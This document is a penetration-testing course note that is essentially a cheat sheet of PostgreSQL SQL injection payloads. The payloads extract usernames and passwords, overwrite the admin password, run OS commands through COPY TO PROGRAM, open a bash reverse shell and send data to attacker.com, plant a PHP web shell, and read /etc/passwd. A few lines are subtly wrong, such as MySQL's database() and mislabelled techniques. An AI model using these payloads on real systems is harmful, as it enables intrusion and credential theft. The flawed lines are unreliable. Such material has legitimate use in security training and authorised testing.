---
tags: [vapt, sqli, intermediate]
difficulty: intermediate
module: "06 - SQL Injection"
topic: "06.16 PostgreSQL Specific Payloads"
---

# 06.16 — PostgreSQL Specific Payloads

## PostgreSQL Detection

```sql
-- DETECT POSTGRESQL:
-- PostgreSQL uses $$ for string literals:
?id=1 AND 1=1--   → works
?id=1 AND 'a'='a' → works

-- VERSION:
SELECT version()
-- → "PostgreSQL 13.4 on x86_64-pc-linux-gnu..."

-- PG-SPECIFIC FUNCTIONS:
SELECT pg_sleep(5)   → 5 second delay (PostgreSQL-only)
SELECT current_database()
SELECT current_user
SELECT session_user

-- DETECT VIA ERROR:
?id=1 AND CAST(version() AS INT)--
-- → "invalid input syntax for type integer: 'PostgreSQL 13.4...'"
-- Error includes version string!

-- DISTINGUISH FROM MYSQL (SLEEP vs pg_sleep):
?id=1 AND SLEEP(5)--        → works = MySQL
?id=1 AND pg_sleep(5)--     → works = PostgreSQL (add via ; though)
'; SELECT pg_sleep(5)--     → stacked query for PostgreSQL
```

---

## PostgreSQL Information Extraction

```sql
-- CURRENT DATABASE:
SELECT current_database()
SELECT datname FROM pg_database WHERE datistemplate=false

-- CURRENT USER:
SELECT current_user
SELECT session_user
SELECT user

-- VERSION:
SELECT version()
SELECT split_part(version(), ' ', 2)   -- just version number

-- LIST ALL DATABASES:
SELECT datname FROM pg_database

-- LIST ALL TABLES IN PUBLIC SCHEMA:
SELECT tablename FROM pg_tables WHERE schemaname='public'
SELECT table_name FROM information_schema.tables WHERE table_schema='public'

-- LIST ALL SCHEMAS:
SELECT nspname FROM pg_namespace

-- LIST ALL COLUMNS IN TABLE:
SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'

-- LIST ALL USERS:
SELECT usename, passwd FROM pg_shadow   -- requires superuser!
SELECT usename FROM pg_user

-- CHECK IF CURRENT USER IS SUPERUSER:
SELECT usesuper FROM pg_user WHERE usename=current_user
-- TRUE → superuser = very powerful!
```

---

## PostgreSQL Data Extraction

```sql
-- CONCAT WITH ||:
SELECT username || ':' || password FROM users;

-- STRING AGGREGATION:
SELECT string_agg(username, ',') FROM users;
SELECT string_agg(username || ':' || password, '\n') FROM users;

-- ARRAY TO STRING:
SELECT array_to_string(array_agg(username), ',') FROM users;

-- PAGINATION:
SELECT username FROM users LIMIT 1 OFFSET 0;
SELECT username FROM users LIMIT 1 OFFSET 1;

-- FIRST ROW:
SELECT username FROM users LIMIT 1;
SELECT username FROM users ORDER BY id LIMIT 1;
```

---

## PostgreSQL Error-Based

```sql
-- CAST ERROR (best technique):
' AND CAST((SELECT database()) AS INT)--
-- Error: "invalid input syntax for type integer: 'myapp'"

-- FULL EXAMPLES:
' AND CAST((SELECT version()) AS INT)--
' AND CAST((SELECT current_user) AS INT)--
' AND CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') AS INT)--
' AND CAST((SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users') AS INT)--
' AND CAST((SELECT string_agg(username||':'||password,',') FROM users) AS INT)--

-- XPATH ERROR:
' AND 1=(SELECT CAST((SELECT current_database()) AS XML))--
-- Generates: "invalid XML content" with data in message

-- INTEGER OVERFLOW:
' AND 1=1/(SELECT 0 FROM users LIMIT 1)--
-- Division by zero error (confirms table exists)

-- NEGATIVE INDEX TRICK:
' AND 1=(-1)^(SELECT 1)--
```

---

## PostgreSQL Time-Based

```sql
-- pg_sleep:
'; SELECT pg_sleep(5)--     -- stacked query (most reliable)
' AND (SELECT pg_sleep(5)) IS NOT NULL--

-- CONDITIONAL:
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (current_user='postgres') THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- EXTRACT DATA:
'; SELECT CASE WHEN (SUBSTRING(current_user,1,1)='p') THEN pg_sleep(3) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='5') THEN pg_sleep(3) ELSE pg_sleep(0) END--

-- TABLE EXISTS CHECK:
'; SELECT CASE WHEN (EXISTS(SELECT 1 FROM pg_tables WHERE tablename='users')) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

---

## PostgreSQL Stacked Queries

PostgreSQL supports stacked queries — multiple statements separated by `;`.

```sql
-- STACKED QUERIES:
'; SELECT pg_sleep(5)--
'; UPDATE users SET password='hacked' WHERE username='admin'--

-- CREATE ADMIN USER:
'; INSERT INTO users (username,password,is_admin) VALUES ('hacker','password',1)--

-- COPY TO (exfiltrate data):
'; COPY users TO PROGRAM 'curl http://attacker.com/?data='||username||':'||password FROM users--

-- CREATE TABLE + COPY:
'; CREATE TABLE tmp_data (out TEXT); COPY tmp_data FROM PROGRAM 'id'; SELECT * FROM tmp_data--
-- Then: UNION SELECT null,out FROM tmp_data-- → OS command output!
```

---

## PostgreSQL COPY TO/FROM — RCE!

```sql
-- COPY TO PROGRAM (PostgreSQL 9.3+, requires superuser):
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt'--

-- REVERSE SHELL:
'; COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'--

-- READ OUTPUT:
'; CREATE TABLE cmd_output (data TEXT);--
'; COPY cmd_output FROM PROGRAM 'id'--
'; SELECT string_agg(data,'\n') FROM cmd_output--
-- Then: UNION SELECT null,string_agg(data,'\n') FROM cmd_output--

-- WRITE FILE (via COPY):
'; COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--
-- Then: access https://target.com/shell.php?cmd=id
```

---

## PostgreSQL Extensions — dblink

```sql
-- dblink: make connections to other databases (useful for OOB!):
-- Requires: CREATE EXTENSION dblink (superuser)

-- OOB DNS via dblink:
'; SELECT dblink_connect('host=attacker.com user=x dbname=y')--
-- → Connection attempt to attacker.com:5432 → DNS query captured!

-- EXTRACT DATA VIA dblink:
'; SELECT dblink('host=attacker.com user=x password=data', 'SELECT 1')--
-- → attacker.com logs show: user=data (we sent data as password field!)
```

---

## PostgreSQL Large Objects — File Read

```sql
-- LARGE OBJECTS (lo_import / lo_export):
-- Requires superuser

-- READ FILE:
'; SELECT lo_import('/etc/passwd')--
-- Returns an oid (object id)
'; SELECT lo_get(oid)--
-- OR: use pg_read_file() in newer versions

-- pg_read_file (superuser):
'; SELECT pg_read_file('/etc/passwd')--
'; SELECT pg_read_file('/var/www/html/config.php')--

-- LIST DIRECTORY:
'; SELECT pg_ls_dir('/var/www/html/')--
```

---

## PostgreSQL Cheat Sheet Summary

```
DETECTION:   version(), current_database(), pg_sleep(5)
DATABASES:   SELECT datname FROM pg_database
SCHEMAS:     SELECT nspname FROM pg_namespace
TABLES:      SELECT tablename FROM pg_tables WHERE schemaname='public'
COLUMNS:     SELECT column_name FROM information_schema.columns WHERE table_name='users'
DATA:        SELECT username||':'||password FROM users (use ||)
AGGREGATION: SELECT string_agg(username||':'||password,',') FROM users
TIME:        SELECT pg_sleep(5) / CASE WHEN cond THEN pg_sleep(5) ELSE pg_sleep(0) END
ERROR:       CAST((SELECT ...) AS INT)
STACKED:     ; SELECT ...; --
RCE:         COPY (SELECT '') TO PROGRAM 'cmd' (superuser)
FILE:        SELECT pg_read_file('/etc/passwd') (superuser)
OOB:         SELECT dblink_connect('host=attacker.com...')
```

---

## Related Notes
- [[04 - Union-Based SQLi]] — UNION SELECT (PostgreSQL uses || for concat)
- [[03 - Error-Based SQLi]] — CAST error technique
- [[06 - Blind SQLi Time-Based]] — pg_sleep usage
- [[17 - MSSQL Specific Payloads]] — MSSQL comparison
